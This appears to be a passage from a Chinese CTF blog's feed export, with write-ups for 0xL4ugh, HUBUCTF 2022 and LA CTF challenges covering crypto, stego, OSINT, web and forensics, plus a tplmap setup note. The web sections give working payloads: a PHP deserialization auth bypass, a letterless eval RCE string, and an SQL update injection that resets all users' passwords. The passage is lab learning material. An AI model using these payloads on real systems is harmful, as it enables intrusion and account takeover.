class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n = <span class="hljs-subst">&#123;N&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;e = <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c = <span class="hljs-subst">&#123;c&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>显然低加密指数攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> gmpy2<br>n = <span class="hljs-number">16691865792147194697602300512532851182049374635648801189035809706515463120586646192481229145243032049569188562652509317620313234450062651687702398851985141210252080200118496555573100538082230667123330012596663673730204381449416210246747100065137562877723883087453655498192797717322414163929033958154847172474876805828355467779563924126108244847992313964795565023554963296215243179420547862638306573737884301209065640499511319512400331964327680966267406302192650421152395257843371809022919488155958420254813754963104236903270765037373600427365083337259089056941701762267110792581437924801009323096077817633370816094073</span><br>e = <span class="hljs-number">3</span><br>c = <span class="hljs-number">527715545190279160683427564102415343921040361668522479441727171363460126920288425567651662947621100428078618585624707291232885706132068328305084115992340337032439274527186826778447854890982475878955397378947713414201050357209397140391734937299379698886378260075489810871914081834819238233619226377140629000968272406078503709732856007314599153696811725183993977424740513321277346005097500256459835713834182894305536107589525724571208098322359262186595358977825573193007799376102473240254372327730839223120373818874006086733633525830272119104666835113980722223258389364156995110666626033474727892354233040278510447646</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">n, e, c</span>):<br>    k = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        m1 = k * n + c<br>        m, t = gmpy2.iroot(m1, e)<br>        <span class="hljs-keyword">if</span> t:<br>            <span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br>            <span class="hljs-keyword">break</span><br>        k += <span class="hljs-number">1</span><br><br>exp(n, e, c)<br><span class="hljs-comment">#b&#x27;OSC&#123;C0N6r47U14710N5!_Y0U_UND3r574ND_H0W_70_U53_H4574D5_8r04DC457_4774CK_______0xL4ugh&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Detected"><a href="#Detected" class="headerlink" title="Detected"></a>Detected</h3><h4 id="题目说明-3"><a href="#题目说明-3" class="headerlink" title="题目说明"></a>题目说明</h4><p>Can you be undetected ?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br>session_start();<br>$servername = <span class="hljs-string">&quot;localhost&quot;</span>;<br>$username = <span class="hljs-string">&quot;root&quot;</span>;<br>$dbname = <span class="hljs-string">&quot;ctf_test&quot;</span>;<br>$password = <span class="hljs-string">&quot;&quot;</span>;<br>// Create connection<br>$conn = new mysqli($servername, $username, $password,$dbname);<br><br>// Check connection<br><span class="hljs-keyword">if</span> ($conn-&gt;connect_error) &#123;<br>    die(<span class="hljs-string">&quot;Connection failed: &quot;</span> . $conn-&gt;connect_error);<br>&#125;<br><br>$session=mysqli_real_escape_string($conn,$_COOKIE[<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>]);<br>$ip=$_SERVER[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];<br><br><br><br><br>$conn-&gt;query(<span class="hljs-string">&quot;INSERT into misc (ip,phpsess)values(&#x27;$ip&#x27;,&#x27;$session&#x27;)&quot;</span>);<br><br><span class="hljs-keyword">if</span>($conn-&gt;query(<span class="hljs-string">&quot;select Distinct ip from misc where phpsess=&#x27;$session&#x27;&quot;</span>)-&gt;num_rows &gt;<span class="hljs-number">20</span>)<br>&#123;<br>    echo <span class="hljs-string">&quot;Flag&#123;here&#125;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    echo <span class="hljs-string">&quot;Still Not 20 ip yet :D&quot;</span>;<br>&#125;<br><br><br>?&gt;<br></code></pre></td></tr></table></figure><h4 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h4><p>打开就看到了flag<br><img src="/mdimg/0xl4/6.png"></p><h3 id="welcome"><a href="#welcome" class="headerlink" title="welcome"></a>welcome</h3><h4 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h4><p><code>0xL4ugh&#123;W3LC0ME_T0_0UR_C7F_FREE_PALESTINE&#125;</code></p><h2 id="Steganography"><a href="#Steganography" class="headerlink" title="Steganography"></a>Steganography</h2><h3 id="Uraa"><a href="#Uraa" class="headerlink" title="Uraa"></a>Uraa</h3><h4 id="题目说明-4"><a href="#题目说明-4" class="headerlink" title="题目说明"></a>题目说明</h4><p>I love Urahara. he keeps hiding the secrets.</p><h4 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h4><p><a href="https://github.com/RickdeJager/stegseek/releases/tag/v0.6">https://github.com/RickdeJager/stegseek/releases/tag/v0.6</a><br>下载deb包<br>安装：<br><code>sudo apt install ./stegseek_0.6-1.deb </code><br><code>stegseek --crack ./Uraa.jpg</code><br><img src="/mdimg/0xl4/7.png"><br><img src="/mdimg/0xl4/8.png"></p><h3 id="Zar"><a href="#Zar" class="headerlink" title="Zar"></a>Zar</h3><h4 id="题目说明-5"><a href="#题目说明-5" class="headerlink" title="题目说明"></a>题目说明</h4><p>Fast as zaraki boi. try to find him.</p><h4 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="/mdimg/0xl4/9.png"><br>20转0，09转1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">flag=<span class="hljs-string">&#x27;20 20 20 20 09 09 20 20 20 20 0D 0A 09 0D 0A 20 20 20 20 20 09 09 09 09 20 20 20 0D 0A 09 0D 0A 20 20 20 20 20 09 20 20 09 09 20 20 0D 0A 09 0D 0A 20 20 20 20 20 20 09 09 20 09 20 20 0D 0A 09 0D 0A 20 20 20 20 20 09 09 09 20 09 20 09 0D 0A 09 0D 0A 20 20 20 20 20 09 09 20 20 09 09 09 0D 0A 09 0D 0A 20 20 20 20 20 09 09 20 09 20 20 20 0D 0A 09 0D 0A 20 20 20 20 20 09 09 09 09 20 09 09 0D 0A 09 0D 0A 20 20 20 20 20 09 20 20 20 09 09 20 0D 0A 09 0D 0A 20 20 20 20 20 20 09 09 20 09 20 20 0D 0A 09 0D 0A 20 20 20 20 20 09 20 09 20 20 09 09 0D 0A 09 0D 0A 20 20 20 20 20 20 09 09 20 09 20 09 0D 0A 09 0D 0A 20 20 20 20 20 09 20 09 09 09 09 09 0D 0A 09 0D 0A 20 20 20 20 20 20 09 09 20 09 20 20 0D 0A 09 0D 0A 20 20 20 20 20 20 09 09 20 09 20 09 0D 0A 09 0D 0A 20 20 20 20 20 09 20 09 09 09 09 09 0D 0A 09 0D 0A 20 20 20 20 20 09 20 09 09 20 09 20 0D 0A 09 0D 0A 20 20 20 20 20 20 09 09 20 09 20 20 0D 0A 09 0D 0A 20 20 20 20 20 09 20 09 20 20 09 20 0D 0A 09 0D 0A 20 20 20 20 20 20 09 09 20 09 20 20 0D 0A 09 0D 0A 20 20 20 20 20 09 20 20 09 20 09 09 0D 0A 09 0D 0A 20 20 20 20 20 20 09 09 20 20 20 09 0D 0A 09 0D 0A 20 20 20 20 20 09 20 09 09 09 09 09 0D 0A 09 0D 0A 20 20 20 20 20 09 20 20 20 20 09 20 0D 0A 09 0D 0A 20 20 20 20 20 20 09 09 20 20 20 20 0D 0A 09 0D 0A 20 20 20 20 20 09 20 20 09 20 20 09 0D 0A 09 0D 0A 20 20 20 20 20 09 09 09 09 09 20 09 0D 0A 09 0D 0A 20 20 0D 0A 0D 0A 0D 0A&#x27;</span><br><br>a=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag.split(<span class="hljs-string">&#x27; &#x27;</span>):<br>    <span class="hljs-keyword">if</span> i == <span class="hljs-string">&#x27;20&#x27;</span>:<br>      a+=<span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">if</span> i == <span class="hljs-string">&#x27;09&#x27;</span>:<br>       a+=<span class="hljs-string">&#x27;1&#x27;</span><br>    <span class="hljs-keyword">if</span> i == <span class="hljs-string">&#x27;0D&#x27;</span>:<br>       a+=<span class="hljs-string">&#x27; &#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a.split(<span class="hljs-string">&#x27; &#x27;</span>):<br>   <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(i)&gt;<span class="hljs-number">2</span>:<br>      <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i,<span class="hljs-number">2</span>)),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment">#0xL4ugh&#123;F4S5_45_Z4R4K1_B0I&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Colorful"><a href="#Colorful" class="headerlink" title="Colorful"></a>Colorful</h3><h4 id="题目说明-6"><a href="#题目说明-6" class="headerlink" title="题目说明"></a>题目说明</h4><h4 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h4><p><a href="https://www.dcode.fr/hexahue-cipher">https://www.dcode.fr/hexahue-cipher</a><br><code>0xL4ugh&#123;TH1S_15_H3X4HU3_C0D3&#125;</code></p><h3 id="4-Bloody"><a href="#4-Bloody" class="headerlink" title="4.Bloody"></a>4.Bloody</h3><p>just line ? but it contain a lot of infoooooooos</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./Bloody.png&quot;</span>)<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br>h, w= (img.size)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>        pixel = (img.getpixel((i,j)))<br>        <span class="hljs-keyword">if</span> pixel != (<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">0</span>):<br>          flag+=<span class="hljs-built_in">chr</span>(pixel[<span class="hljs-number">0</span>])<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&#125;&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>           <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#0xL4ugh&#123;R_G_B_FOR_TH3_W1N&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Osint"><a href="#Osint" class="headerlink" title="Osint"></a>Osint</h2><h3 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h3><h4 id="题目说明-7"><a href="#题目说明-7" class="headerlink" title="题目说明"></a>题目说明</h4><p>i lost my cat a while ago , and recently i found a photo of it can you help me track my cat by getting the location of this image.<br>flag is in the format: 0xL4ugh{Latitude,Longitude}. Use the 6 digits after the decimal point. (ex: 112.1234567 –&gt; 112.123456)</p><h4 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路"></a>解题思路</h4><p>图片左下角<code>Saswat Kumar Dash</code>是摄影师<br>google<code>Saswat Kumar Dash Cat</code><br>通过图片附件的名字找到了一模一样的图<code>[https://www.flickr.com/photos/95789140@N05/10472912333](https://www.flickr.com/photos/95789140@N05/10472912333)</code><br><img src="/mdimg/0xl4/10.png"><br>在网站有拍摄地点<br>在url上显示了经纬度<br><code>[https://www.flickr.com/map/?fLat=29.386886&amp;fLon=47.977166&amp;zl=13&amp;everyone_nearby=1&amp;photo=10472912333](https://www.flickr.com/map/?fLat=29.386886&amp;fLon=47.977166&amp;zl=13&amp;everyone_nearby=1&amp;photo=10472912333)</code><br><code>0xL4ugh&#123;29.386886,47.977166&#125;</code></p><h3 id="Hacker"><a href="#Hacker" class="headerlink" title="Hacker"></a>Hacker</h3><h4 id="题目说明-8"><a href="#题目说明-8" class="headerlink" title="题目说明"></a>题目说明</h4><p>A hacker named z1Luxiboy bypassed our system protection with a Bay pass tool</p><h4 id="解题思路-11"><a href="#解题思路-11" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="/mdimg/0xl4/11.png"><br><code>[https://www.reddit.com/user/z1Luxiboy/comments/1149mst/%D8%A8%D9%88%D8%B4%D9%83%D8%A7%D9%83_%D9%85%D8%AD%D9%81%D9%88%D8%B8/](https://www.reddit.com/user/z1Luxiboy/comments/1149mst/%D8%A8%D9%88%D8%B4%D9%83%D8%A7%D9%83_%D9%85%D8%AD%D9%81%D9%88%D8%B8/)</code><br><img src="/mdimg/0xl4/12.png"><br><img src="/mdimg/0xl4/13.png"><code>找与这个评论的id相关的 z1Marvelman</code><br>找到github这个b的github<code>[https://github.com/Marvel0x11?tab=repositories](https://github.com/Marvel0x11?tab=repositories)</code><br>有一个骗人的flag<br><code>[https://github.com/Marvel0x11/Baypass-tool/commit/792cc0477af3a8703919133c293877d086908e6a](https://github.com/Marvel0x11/Baypass-tool/commit/792cc0477af3a8703919133c293877d086908e6a)</code><br><img src="/mdimg/0xl4/14.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HUBUCTF 2022 新生赛web</title>
    <link href="/2023/02/16/HUBUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B-web-wp/"/>
    <url>/2023/02/16/HUBUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B-web-wp/</url>
    
    <content type="html"><![CDATA[<h1 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br>show_source(__FILE__);<br>$username  = <span class="hljs-string">&quot;this_is_secret&quot;</span>; <br>$password  = <span class="hljs-string">&quot;this_is_not_known_to_you&quot;</span>; <br>include(<span class="hljs-string">&quot;flag.php&quot;</span>);//here I changed those two <br>$info = isset($_GET[<span class="hljs-string">&#x27;info&#x27;</span>])? $_GET[<span class="hljs-string">&#x27;info&#x27;</span>]: <span class="hljs-string">&quot;&quot;</span> ;<br>$data_unserialize = unserialize($info);<br><span class="hljs-keyword">if</span> ($data_unserialize[<span class="hljs-string">&#x27;username&#x27;</span>]==$username&amp;&amp;$data_unserialize[<span class="hljs-string">&#x27;password&#x27;</span>]==$password)&#123;<br>    echo $flag;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    echo <span class="hljs-string">&quot;username or password error!&quot;</span>;<br><br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p><code>if ($data_unserialize[&#39;username&#39;]==$username&amp;&amp;$data_unserialize[&#39;password&#39;]==$password)&#123; echo $flag; &#125;</code><br>弱比较，令其为true就行，与任何字符串比较都为true<br><img src="/wp/hubuctf/1.png"><br>构造反序列化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br>$info = array(<br><span class="hljs-string">&#x27;username&#x27;</span>=&gt;true,         //布尔类型<br><span class="hljs-string">&#x27;password&#x27;</span>=&gt;true<br>);<br>$serialized_data = serialize($info);<br>echo  $serialized_data ;<br>?&gt;<br><span class="hljs-comment">#a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/wp/hubuctf/2.png"></p><h1 id="HowToGetShell"><a href="#HowToGetShell" class="headerlink" title="HowToGetShell"></a>HowToGetShell</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br>show_source(__FILE__);<br>$mess=$_POST[<span class="hljs-string">&#x27;mess&#x27;</span>];<br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/[a-zA-Z]/&quot;</span>,$mess))&#123;<br>    die(<span class="hljs-string">&quot;invalid input!&quot;</span>);<br>&#125;<br><span class="hljs-built_in">eval</span>($mess);<br></code></pre></td></tr></table></figure><p>无字母rce<br>异或构造：<code>$_=&#39;/(/).]/&#39;^&#39;_@_@@;@&#39;;$_();</code>  //phpinfo<br><img src="/wp/hubuctf/3.png"></p><h1 id="Calculate"><a href="#Calculate" class="headerlink" title="Calculate"></a>Calculate</h1><p><img src="/wp/hubuctf/4.png"><br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><br>pattern=<span class="hljs-string">&#x27;&lt;div style=&quot;display:inline;color:#\w&#123;6&#125;&quot;&gt;(.*?)&lt;/div&gt;&#x27;</span> <span class="hljs-comment">#正则获取要计算的数</span><br>url=<span class="hljs-string">&quot;http://43.143.7.97:29000/&quot;</span><br>session=requests.session() <span class="hljs-comment">#获取session</span><br>res=session.post(url)<br>time.sleep(<span class="hljs-number">1</span>) <span class="hljs-comment">#停顿1s</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    time.sleep(<span class="hljs-number">1</span>)<br>    result=re.findall(pattern,res.text)<br>    num=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(result)-<span class="hljs-number">1</span>):<br>        num+=result[i]<br>    ans=<span class="hljs-built_in">eval</span>(num) <span class="hljs-comment">#计算获取的字符串</span><br>    res=session.post(url,data=&#123;<span class="hljs-string">&quot;ans&quot;</span>:ans&#125;)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;NSSCTF&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>      <span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><h1 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h1><p><img src="/wp/hubuctf/8.png"><br>尝试sqlmap<br><img src="/wp/hubuctf/5.png"><br>只跑出来我刚注册的账号密码<br>看了大佬的wp知道flag在描述，跑一下<br><img src="/wp/hubuctf/6.png"><br>6<br>只能跟着大佬wp学update注入辣<br>注入点在age<br><img src="/wp/hubuctf/7.png"><br>根据前面跑出来的表，分析<br><img src="/wp/hubuctf/9.png"><br><img src="/wp/hubuctf/10.png"><br><img src="/wp/hubuctf/11.png"><br>这样当前表的所有的用户昵称都改为密码都改为了123<br><code>nickname=aaa&amp;age=666,password=0x3230326362393632616335393037356239363462303731353264323334623730%23&amp;description=666&amp;token=</code><br><code>#0x3230326362393632616335393037356239363462303731353264323334623730=hex(md5(‘123’)) </code><br><img src="/wp/hubuctf/12.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HUBUCTF 2022 新生赛vmem</title>
    <link href="/2023/02/16/HUBUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B-vmem/"/>
    <url>/2023/02/16/HUBUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B-vmem/</url>
    
    <content type="html"><![CDATA[<p>内存取证，vol3文件dump不下来，只能用vol2<br>vol2安装：<a href="https://blog.csdn.net/qq_42947816/article/details/119395804">https://blog.csdn.net/qq_42947816/article/details/119395804</a><br><code>volatility -f /home/kali/桌面/Windows7.vmem imageinfo</code><br><img src="/wp/vmem/1.png"><br><code>volatility -f /home/kali/桌面/Windows7.vmem --profile=Win2008R2SP1x64_23418 filescan|grep &#39;flag</code><br><img src="/wp/vmem/2.png"><br>提取文件<br><code>volatility -f /home/kali/桌面/Windows7.vmem --profile=Win2008R2SP1x64_23418 dumpfiles -Q 虚拟地址 -D 保存位置</code><br>如：<br><code>volatility -f /home/kali/桌面/Windows7.vmem --profile=Win2008R2SP1x64_23418 dumpfiles -Q 0x000000005eb84f20 -D /home/kali/桌面/1</code><br>flag1：<br><code>the first part of flag is : NSSCTF&#123;W0w_y0u_G3t</code><br>flag2：<br><img src="/wp/vmem/3.png"><br>flag3：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">flag3 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag3.txt&#x27;</span>).read()<br>flag_enc = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag3)):<br>    flag_enc += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(flag3[i]) ^ <span class="hljs-number">0xf</span> - <span class="hljs-number">6</span>)<br><span class="hljs-built_in">print</span>(flag_enc)<br><span class="hljs-comment"># &#125;al):&#123;m)yh&#123;&#125;)fo)oehn)`z)3)VPF|V^hg](t </span><br></code></pre></td></tr></table></figure><p>异或一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">enc=<span class="hljs-string">&#x27;&#125;al):&#123;m)yh&#123;&#125;)fo)oehn)`z)3)VPF|V^hg](t&#x27;</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(enc[i]) ^ <span class="hljs-number">0xf</span> - <span class="hljs-number">6</span>)<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#the 3rd part of flag is : _YOu_WanT!&#125;                </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tplmap安装小记</title>
    <link href="/2023/02/15/tplmap%E5%AE%89%E8%A3%85%E5%8F%8A%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/"/>
    <url>/2023/02/15/tplmap%E5%AE%89%E8%A3%85%E5%8F%8A%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/</url>
    
    <content type="html"><![CDATA[<p>浅浅记录一下捏（笑<br>kali：<br>转换为python2：<br><code>sudo update-alternatives --config python</code><br><img src="/note/1/1.png"><br>安装tplmap包：<br><code>git clone https://github.com/epinna/tplmap</code><br><code>cd tplmap</code><br>安装库：<br><code>pip install -r requirements.txt</code><br><img src="/note/1/2.png"><br>报错<br>原因是kali默认只有pip3<br>对pip换源<br><code>pip config set global.index-url [https://pypi.tuna.tsinghua.edu.cn/simple](https://pypi.tuna.tsinghua.edu.cn/simple)</code><br>升级pip：<br><code>pip install --upgrade pip</code><br><img src="/note/1/3.png"><br>23.0为最新<br>安装yaml库:<br><code>python -m pip install pyyaml </code><br><img src="/note/1/4.png"><br>测试：<br><img src="/note/1/5.png"></p>]]></content>
    
    
    <categories>
      
      <category>环境配置</category>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LA CTF-wp by Hor1zon</title>
    <link href="/2023/02/14/LA%20CTF/"/>
    <url>/2023/02/14/LA%20CTF/</url>
    
    <content type="html"><![CDATA[<p><strong>题目附件官方：<a href="https://github.com/uclaacm/lactf-archive/tree/master/2023">https://github.com/uclaacm/lactf-archive/tree/master/2023</a></strong></p><p><img src="/img/g.png"></p><p><img src="/mdimg/lactf/640.gif"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="metaverse"><a href="#metaverse" class="headerlink" title="metaverse"></a>metaverse</h3><h4 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h4><p>Metaenter the metaverse and metapost about metathings. All you have to metado is metaregister for a metaaccount and you’re good to metago.<br><a href="https://metaverse.lac.tf/">https://metaverse.lac.tf/</a><br>You can metause our fancy new metaadmin metabot to get the admin to metaview your metapost!</p><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>g0at：应该是有人(zhanyi✌)打穿了，鼠鼠直接捡漏，账号密码123就直接进去了捏<br><img src="/mdimg/lactf/1.png"></p><h3 id="college-tour"><a href="#college-tour" class="headerlink" title="college-tour"></a><strong>college-tour</strong></h3><h4 id="题目说明-1"><a href="#题目说明-1" class="headerlink" title="题目说明"></a>题目说明</h4><p>Welcome to UCLA! To explore the #1 public college, we have prepared a scavenger hunt for you to walk all around the beautiful campus.<br><img src="/mdimg/lactf/2.png"></p><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="/mdimg/lactf/3.png"><br>到处找flag就行了<br><code>lactf&#123;j03_4nd_j0S3phIn3_bRU1n_sAY_hi&#125;</code></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="rut-roh-relro"><a href="#rut-roh-relro" class="headerlink" title="rut-roh-relro"></a><strong>rut-roh-relro</strong></h3><h4 id="题目说明-2"><a href="#题目说明-2" class="headerlink" title="题目说明"></a>题目说明</h4><p>My friend keeps writing super insecure C programs but I’m too lazy to fix his code. I’m sure it’ll be fine as long as I use enough exploit mitigations, right?<br><code>nc lac.tf 31134</code></p><h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 